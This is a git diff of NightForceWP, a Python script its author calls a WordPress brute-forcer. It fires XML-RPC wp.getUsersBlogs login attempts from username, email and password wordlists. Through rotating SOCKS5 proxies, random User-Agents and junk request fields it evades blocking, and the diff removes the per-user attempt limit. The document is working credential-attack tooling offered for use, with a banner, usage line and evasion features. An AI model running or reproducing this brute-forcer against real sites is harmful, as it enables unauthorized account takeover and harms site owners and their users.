@@ -7,6 +7,7 @@ import logging
 from fake_useragent import UserAgent
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from colorama import Fore, init
+from threading import Thread, Event
 
 # Инициализация colorama и логирования
 init(autoreset=True)
@@ -15,21 +16,23 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 __author__ = 'MidN1ght'
 
 # ASCII баннер
-banner = """
+banner = Fore.MAGENTA + """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠀⠀
-⠀⠀⠘⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀
-⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠁⠀⠀⠀
-⠀⠀⠀⠀⠀⠈⠛⢿⣿⣶⣦⠈⣿⡟⢻⡟⢻⣿⠁⣴⣶⣿⡿⠛⠁⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣉⠛⠋⣠⡿⢀⣾⣷⡀⢿⣄⠙⠛⣉⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣴⣄⠀⣿⡉⢉⣉⣤⣾⣿⣿⣷⣤⣉⡉⢉⣿⠀⣠⣦⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢻⣿⠀⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⠀⣿⡟⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢹⡀⢹⣧⠈⠉⠛⠋⢁⡈⠙⠛⠉⠁⣼⡏⢀⡏⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣧⠈⣿⣦⣀⡀⠄⢸⡇⠠⢀⣀⣴⣿⠁⣼⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠈⠀⠸⠿⣏⠀⢤⣾⣷⡤⠀⣹⠿⠇⠀⠁⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⡤⠀⣀⣉⣉⣀⠀⢤⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢀⡀⠀⡀⢀⠀⢀⡀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⢶⣶⣶⡶⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿
+⣿⣿⣧⡈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣼⣿⣿
+⣿⣿⣿⣷⣄⠈⠛⢿⣿⣿⣿⣿⣿⣿⠿⠿⣿⣿⣿⣿⣿⣿⡿⠛⠁⣠⣾⣿⣿⣿
+⣿⣿⣿⣿⣿⣷⣤⡀⠀⠉⠙⣷⠀⢠⡄⢠⡄⠀⣾⠋⠉⠀⢀⣤⣾⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⠶⣤⣴⠟⢀⡿⠁⠈⢿⡀⠻⣦⣤⠶⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⠋⠻⣿⠀⢶⡶⠶⠛⠁⠀⠀⠈⠛⠶⢶⡶⠀⣿⠟⠙⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⡄⠀⣿⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⣿⠀⢠⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡆⢿⡆⠘⣷⣶⣤⣴⡾⢷⣦⣤⣶⣾⠃⢰⡿⢰⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⠘⣷⠀⠙⠿⢿⣻⡇⢸⣟⡿⠿⠋⠀⣾⠃⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣷⣿⣇⣀⠰⣿⡛⠁⠈⢛⣿⠆⣀⣸⣿⣾⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⢛⣿⠿⠶⠶⠿⣿⡛⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡿⢿⣿⢿⡿⣿⡿⢿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⡉⠉⠉⢉⣡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
 ███╗░░██╗██╗░██████╗░██╗░░██╗████████╗███████╗░█████╗░██████╗░░█████╗░███████╗░██╗░░░░░░░██╗██████╗░
@@ -42,10 +45,12 @@ banner = """
 
 NIGHTFORCEWP v.1.0.1       Author: ~MidN1ght~
 EXAMPLE:
-python nightforce.py --usernames user.txt --passwords pass.txt --url "https://example.com/ --use-proxies"
--u --usernames   wordlist username
+python nightforce.py --usernames user.txt --passwords pass.txt --url "https://example.com/" --use-proxies
+-u --usernames   wordlist username 
+OR
+-e --emails      wordlist emails
 -p --passwords   wordlist passwords
---url            "https://example.com/" 
+--url            "https://example.com/"
 --use-proxies    on/off list proxies in script
 """
 
@@ -109,7 +114,6 @@ proxies = [
     {"socks5": "socks5://212.83.138.172:55465"}
 ]
 
-
 # Настройка случайного User-Agent
 ua = UserAgent()
 
@@ -117,21 +121,6 @@ ua = UserAgent()
 user_queue = []
 password_queue = []
 results_log = []
-
-# Функция для отображения индикатора загрузки
-def loading_indicator():
-    for i in range(101):
-        sys.stdout.write(f"\rChecking proxies: {i}% [{'=' * (i // 2)}{'-' * (50 - (i // 2))}]")
-        sys.stdout.flush()
-        time.sleep(0.1)  # Задержка для демонстрации
-
-def check_proxies(proxies):
-    """Проверяет работоспособность прокси и возвращает рабочие прокси."""
-    working_proxies = []
-    for proxy in proxies:
-        if check_proxy(proxy):
-            working_proxies.append(proxy)
-    return working_proxies
 
 def check_proxy(proxy):
     """Проверяет работоспособность прокси и возвращает True, если работает."""
@@ -143,8 +132,23 @@ def check_proxy(proxy):
         return False
     return False
 
+def check_proxies(proxy_list):
+    """Проверяет все прокси и возвращает рабочие"""
+    working_proxies = []
+    total_proxies = len(proxy_list)
+    print(Fore.YELLOW + "Проверка прокси...")
+
+    for index, proxy in enumerate(proxy_list):
+        if check_proxy(proxy):
+            working_proxies.append(proxy)
+            print(Fore.GREEN + f"[PROXY OK] {proxy} - {len(working_proxies)}/{total_proxies}")
+        else:
+            print(Fore.RED + f"[PROXY FAIL] {proxy}")
+
+    return working_proxies
+
 def randomize_data(user, password):
-    # Случайное добавление дополнительного поля
+
     additional_field = f"<additionalField>{random.randint(1, 100)}</additionalField>"
     data = f"<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{user}</string></value></param><param><value><string>{password}</string></value></param>{additional_field}</params></methodCall>"
     return data
@@ -183,13 +187,20 @@ def brute_force(url, user, password):
         print(Fore.GREEN + f"[SUCCESS] Found credentials: {user}:{password}")
         os._exit(0)
 
+def loading_indicator():
+    """Отображает индикатор загрузки во время проверки прокси."""
+    while not all_proxies_checked.is_set():
+        for i in range(11):
+            print(Fore.YELLOW + f"[PROXY CHECKING] {i * 10}%", end="\r")
+            time.sleep(0.5)
+
 def main():
-    global use_proxies, proxies
+    global use_proxies, proxies, all_proxies_checked
 
     parser = argparse.ArgumentParser(description="NightForceWP: WordPress brute-forcer")
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('--usernames', help='File with usernames')
-    group.add_argument('--emails', help='File with emails')
+    group.add_argument('-u', '--usernames', help='File with usernames')
+    group.add_argument('-e', '--emails', help='File with emails')
     parser.add_argument('-p', '--passwords', required=True, help='File with passwords')
     parser.add_argument('--url', required=True, help='Target URL for WordPress login')
     parser.add_argument('--use-proxies', action='store_true', help='Enable using proxies')
@@ -213,10 +224,14 @@ def main():
         return
 
     if use_proxies:
+        all_proxies_checked = Event()  # Сигнал завершения проверки прокси
         loading_thread = Thread(target=loading_indicator)
         loading_thread.start()
+
         proxies = check_proxies(proxies)
+        all_proxies_checked.set()
         loading_thread.join()
+
         if not proxies:
             logging.warning("No working proxies found. Continuing without proxies.")
             use_proxies = False
@@ -224,10 +239,11 @@ def main():
     user_queue.extend(users)
     password_queue.extend(passwords)
 
-    max_threads = 5  # Увеличение количества потоков
+    max_threads = 3  # Сниженное количество потоков
 
     # Ограничение на количество попыток для каждого user:password
-    attempts_limit = 5
+    # attempts_limit = 5
+    # хуйня из под коня не работает
 
     # Случайный порядок запросов
     random.shuffle(user_queue)
@@ -236,7 +252,7 @@ def main():
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         futures = [
             executor.submit(brute_force, args.url, user, password)
-            for user in user_queue for password in password_queue[:attempts_limit]  # Лимит на количество попыток
+            for user in user_queue for password in password_queue  # Убираем лимит
         ]
 
         for future in as_completed(futures):
